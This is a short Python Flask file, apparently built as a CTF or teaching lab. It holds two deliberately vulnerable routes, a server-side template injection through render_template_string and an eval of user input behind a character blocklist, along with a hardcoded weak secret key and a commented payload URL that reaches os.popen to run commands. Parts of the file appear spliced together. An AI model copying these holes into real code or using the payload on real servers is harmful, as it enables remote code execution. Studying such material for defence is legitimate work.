from flask import Flask,render_template,request,render_template_string,session
from datetime import timedelta

app = Flask(__name__)

app.config['SECRET_KEY'] = 'hacker'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
@app.route('/test',methods=['GET', 'POST'])
def test():
    content = request.args.get("content")
    template = '''
        <div>
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
        <h4>Your Money : %s</h4>
        </div>
        ''' %(content, session.get('money'))
    return render_template_string(template)
@app.route('/sess')
def t():
    session['money'] = 100
    return '设置金额成功...'
if __name__ == '__main__':
    app.debug = True
    app.run()flaskInjection.py
black_list = string.ascii_letters + "[]{}\\/ "
@app.route('/calc', methods=['GET'])
def calc():
    if 'expr' not in request.args.keys():
        return "expr is needed!"
    expr = request.args.get('expr')
    for i in black_list:
        for value in request.args.values():
            if i in value:
                return "Hacker"
    try:
        if (len(expr) > 27):
            return "Too long!"
        return str(eval(expr))
    except:
        return "Well......something is wrong?"
    # http://127.0.0.1:5000/test?content={{[].__class__.__base__.__subclasses__()[80].__init__.__globals__[%27__builtins__%27][%27__import__%27](%27os%27).popen(%27calc%27).read()}}